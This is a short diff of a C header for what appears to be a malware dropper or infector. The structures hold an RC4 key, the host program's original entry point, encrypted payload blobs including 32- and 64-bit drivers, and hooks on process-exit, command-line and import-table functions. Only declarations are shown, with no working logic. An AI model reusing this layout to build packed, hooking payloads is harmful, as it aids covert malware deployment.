@@ -60,7 +60,6 @@ typedef struct _data_section_files {
 		DataSectionBlob driver;
 		DataSectionBlob driver64;
 		DataSectionBlob codec;
-		DataSectionBlob	bitmap;
 	} names;
 
 	DataSectionCryptoPack core;
@@ -69,7 +68,6 @@ typedef struct _data_section_files {
 	DataSectionCryptoPack driver;
 	DataSectionCryptoPack driver64;
 	DataSectionCryptoPack codec;
-	DataSectionCryptoPack bitmap;
 } DataSectionFiles;
 
 typedef void (*WINSTARTFUNC)(void);
@@ -79,8 +77,6 @@ typedef  __declspec(align(4)) struct _data_section_header
 	// RC4
 	// Encryption key
 	CHAR rc4key[RC4KEYLEN];
-	// SBox
-	unsigned char gSBox[SBOX_SIZE + 1];
 
 	// OEP
 	WINSTARTFUNC   pfn_OriginalEntryPoint;
@@ -97,11 +93,12 @@ typedef  __declspec(align(4)) struct _data_section_header
 		DataSectionBlob coreThread;
 		DataSectionBlob dumpFile;
 		DataSectionBlob exitProcessHook;
+		DataSectionBlob exitHook;
 		DataSectionBlob GetCommandLineAHook;
 		DataSectionBlob GetCommandLineWHook;
 		DataSectionBlob rvaToOffset;
 		DataSectionBlob rc4;
-		DataSectionBlob hookCall;
+		DataSectionBlob hookIAT;
 		DataSectionBlob load;
 	} functions;
 
@@ -116,7 +113,7 @@ typedef  __declspec(align(4)) struct _data_section_header
 	BOOL isScout;
 
 	CHAR instDir[10];
-	CHAR fPrefix[8];
+	CHAR eliteExports[22];
 	CHAR version[20];
 } DataSectionHeader;
 
